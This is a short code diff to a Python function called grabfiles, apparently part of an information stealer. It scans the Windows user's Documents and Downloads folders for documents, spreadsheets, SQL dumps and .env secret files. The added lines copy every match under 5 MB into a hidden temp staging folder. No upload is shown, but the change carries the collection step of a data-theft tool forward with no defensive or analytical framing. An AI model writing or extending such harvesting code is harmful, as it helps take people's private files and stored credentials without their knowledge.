@@ -1,6 +1,7 @@
 def grabfiles():
-    grabbed_files = []
+    import shutil
     
+    grabbed_files = []
     extensions = ['.txt', '.doc', '.docx', '.pdf', '.xlsx', '.xls', '.csv', '.sql', '.env']
     
     target_dirs = [
@@ -8,6 +9,10 @@ def grabfiles():
         os.path.join(os.environ['USERPROFILE'], 'Documents'),
         os.path.join(os.environ['USERPROFILE'], 'Downloads')
     ]
+    
+    temp_dir = tempfile.gettempdir()
+    files_dir = os.path.join(temp_dir, 'grabbed_files')
+    os.makedirs(files_dir, exist_ok=True)
     
     for target_dir in target_dirs:
         if os.path.exists(target_dir):
@@ -17,9 +22,12 @@ def grabfiles():
                         src = os.path.join(root, file)
                         try:
                             if os.path.getsize(src) < 5 * 1024 * 1024:
+                                dst = os.path.join(files_dir, file)
+                                shutil.copy2(src, dst)
                                 grabbed_files.append({
                                     'path': src,
-                                    'size': os.path.getsize(src)
+                                    'size': os.path.getsize(src),
+                                    'copied': True
                                 })
                         except:
                             continue
